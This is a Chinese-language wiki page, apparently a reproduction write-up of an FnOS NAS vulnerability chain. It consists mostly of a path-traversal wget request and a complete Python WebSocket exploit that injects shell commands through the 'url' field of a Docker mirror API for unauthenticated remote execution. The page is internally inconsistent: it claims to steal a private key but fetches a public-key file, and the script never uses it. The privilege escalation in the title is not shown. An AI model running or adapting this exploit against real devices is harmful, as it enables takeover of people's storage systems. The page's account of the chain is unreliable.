---
title: FnOS漏洞链的复现以及提权
description: FnOS漏洞链的复现以及提权
published: true
date: 2026-02-04T11:46:17.765Z
tags: 
editor: markdown
dateCreated: 2026-02-03T18:04:10.570Z
---

# FnOS 漏洞链复现 + 提权

目标机器：`10.10.10.10`

## 漏洞链总览

1. **路径穿越** → 读取任意文件（获取 RSA 私钥）
2. **利用 RSA 私钥伪造加密通道** → 绕过认证 + 命令注入
3. **最终效果**：未授权 RCE（远程命令执行）

## 步骤 1 – 路径穿越读取 RSA 私钥

接口 `/app-center-static/serviceicon/myapp/...` 未过滤路径穿越，可读取任意文件。
```bash
wget "https://10.10.10.10:8000/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../usr/trim/etc/rsa_public_key.pem" \ -O rsa_private_key.pem --no-check-certificate
```


## 步骤 2 – 利用私钥伪造加密 WebSocket 通道执行命令
利用获取到的 RSA 私钥，构造客户端 → 服务端 的加密数据包，在 `appcgi.dockermgr.systemMirrorAdd` 接口的 `url` 参数实现命令注入。

```py
import websocket
import json
import time
import base64
import argparse
import sys
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_v1_5, AES
from Cryptodome.Util.Padding import pad
from Cryptodome.Random import get_random_bytes

# --- 目标配置 ---
TARGET_URL = "ws://10.10.10.10:8000/websocket?type=main"

# 攻击负载
CMD_TO_EXECUTE = ""

EXPLOIT_PAYLOAD_URL = f"http://10.10.10.10:8000 ; {CMD_TO_EXECUTE} ; /usr/bin/echo "

class TrimEncryptedExploit:
    def __init__(self):
        self.ws = None
        self.si = ""
        self.server_pub_key = ""
        self.step = 0

    def get_reqid(self):
        return str(int(time.time() * 100000))

    def create_encrypted_packet(self, inner_json_dict):
        """
        构造 { "req": "encrypted", ... } 数据包
        """
        try:
            # 1. 生成临时的 AES-256 Key 和 IV
            aes_key = get_random_bytes(32)
            aes_iv = get_random_bytes(16)
            
            # 2. 序列化内部 Payload
            # 注意：separators 去除空格
            inner_data = json.dumps(inner_json_dict, separators=(',', ':')).encode('utf-8')
            
            # 3. AES 加密 Payload (CBC + PKCS7 Padding)
            cipher_aes = AES.new(aes_key, AES.MODE_CBC, aes_iv)
            encrypted_body = cipher_aes.encrypt(pad(inner_data, AES.block_size))
            
            # 4. RSA 加密 AES Key (使用服务器公钥)
            # 这样服务器收到后，能用它的私钥解出我们的 AES Key
            rsa_key_obj = RSA.import_key(self.server_pub_key)
            cipher_rsa = PKCS1_v1_5.new(rsa_key_obj)
            encrypted_aes_key = cipher_rsa.encrypt(aes_key)
            
            # 5. 组装最终包
            wrapper = {
                "req": "encrypted",
                # "reqid": self.get_reqid(), # 外层通常不需要 reqid，如果需要可取消注释
                "iv": base64.b64encode(aes_iv).decode('utf-8'),
                "rsa": base64.b64encode(encrypted_aes_key).decode('utf-8'),
                "aes": base64.b64encode(encrypted_body).decode('utf-8')
            }
            
            return json.dumps(wrapper, separators=(',', ':'))
            
        except Exception as e:
            print(f"❌ 加密构造失败: {e}")
            return None

    def on_open(self, ws):
        print(f"\n[1/2] 连接建立，请求公钥...")
        # 步骤 1: 拿公钥和 SI
        payload = {
            "reqid": self.get_reqid(),
            "req": "util.crypto.getRSAPub"
        }
        ws.send(json.dumps(payload))
        self.step = 1

    def on_message(self, ws, message):
        try:
            # 简单解析
            if message.startswith('{'):
                data = json.loads(message)
            elif message.find('{') > -1:
                data = json.loads(message[message.find('{'):])
            else:
                return

            # --- 步骤 1: 获取公钥和 SI ---
            if self.step == 1 and "pub" in data:
                self.server_pub_key = data["pub"]
                self.si = str(data["si"])
                print(f" [1/2] 握手成功")
                print(f"    SI: {self.si}")
                print(f"    Pub Key 获取成功 ({len(self.server_pub_key)} bytes)")
                
                # --- 步骤 2: 发送加密的 Exploit ---
                self.send_exploit(ws)
                self.step = 2
                return

            # --- 步骤 2: 接收结果 ---
            if self.step == 2:
                print(f"\n💣 [2/2] 收到响应:\n{json.dumps(data, indent=2)}")
                
                if data.get("result") == "succ" or data.get("errno") == 0:
                    print(f"\n[+] 攻击成功！命令已通过加密通道发送。")
                    print(f"[+] 请检查服务器文件: {CMD_TO_EXECUTE}")
                else:
                    print(f"\n[-] 攻击失败，错误码: {data.get('errno')}")
                
                ws.close()

        except Exception as e:
            print(f" 异常: {e}")
            ws.close()

    def send_exploit(self, ws):
        print(f"\n[*] 正在构造加密 Exploit 包...")
        print(f"[*] 注入命令: {CMD_TO_EXECUTE}")
        
        inner_payload = {
            "req": "appcgi.dockermgr.systemMirrorAdd",
            "reqid": self.get_reqid(),
            "url": EXPLOIT_PAYLOAD_URL,
            "name": "EncryptedExploit",
            "si": self.si
        }
        
        print(f"[*] 内部 Payload: {json.dumps(inner_payload)}")
        
        packet = self.create_encrypted_packet(inner_payload)
        
        if packet:
            print(f"[>] 发送加密包 (Len: {len(packet)})...")
            ws.send(packet)

    def run(self):
        self.ws = websocket.WebSocketApp(TARGET_URL,
                                         on_open=self.on_open,
                                         on_message=self.on_message)
        self.ws.run_forever()

if __name__ == "__main__":
    print("=== Trim 协议加密通道未授权 RCE 利用工具 ===")
    exploit = TrimEncryptedExploit()
    exploit.run()
```
